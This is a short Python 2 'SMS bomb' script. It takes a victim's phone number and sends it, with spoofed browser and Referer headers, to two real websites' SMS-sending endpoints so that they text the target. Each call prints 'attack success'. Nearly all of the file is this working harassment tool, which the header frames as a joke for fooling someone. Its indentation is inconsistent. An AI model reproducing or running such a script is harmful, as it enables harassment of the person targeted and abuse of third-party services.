#!/usr/bin/python
#-*- coding: utf-8 -*-
#python2.7
#=====================================================================================================
#smsbomb.py
#author: 	    ym2011
#version:	    0.1
#create:		2016-08-04
#=====================================================================================================
#the short message bomb, a ticky joke for someone you fool 
#the source code is honghu.py and operate.py 
#=====================================================================================================
try:
    import sys
    import os
	import urllib
    import urllib2
    import httplib
	import re
	import string
	import cookielib
except:
    print u '''
运行出错:

  以下的python 库尚未安装：
  
  该应用程序需要的库：sys、 os、urllib、urllib2、httplib、re、string cookielib
  请检查这些依赖库是否安装在您的操作系统上
  
  提示：安装这些库的格式为：
  
  apt-get install 库名字
  
  例如: apt-get install httplib2
  
  或者使用以下方式：
  
  easy_install httplib2
  
'''
    sys.exit(1)


def oupeng(phone):
    datas="" 
    url='http://www.oupeng.com/sms/sendsms.php?os=s60&mobile=%s' % phone
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
                  "Accept": "text/plain",'Referer':'http://www.oupeng.com/download'} 
    #payload=urllib.urlencode(payload)
   
    try:
        request=urllib2.Request(url=url,headers=i_headers)
        response=urllib2.urlopen(request)
        datas=response.read()
        print datas
        print 'attack success!!!'
    except Exception, e:
        print e
        print "attack failed!!!" 

def hongxiu(phone):
    datas=""
    
    url='http://topic.hongxiu.com/wap/action.aspx'
    #请求的数据
    payload={'hidtpye':'1',
        'txtMobile':phone}
    #注意Referer不能为空
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
                  "Accept": "text/plain",'Referer':'http://topic.hongxiu.com/wap/'} 
    payload=urllib.urlencode(payload)
   
    try:
        request=urllib2.Request(url,payload,i_headers)
        response=urllib2.urlopen(request)
        datas=response.read()
        print datas
        print 'attack success!!!'
    except Exception, e:
        print e
        print "attack failed!!!" 



 
if __name__=="__main__":
    phone=raw_input('input the phone:')
    oupeng(phone)
	hongxiu(phone)
	
	
	
	
	
	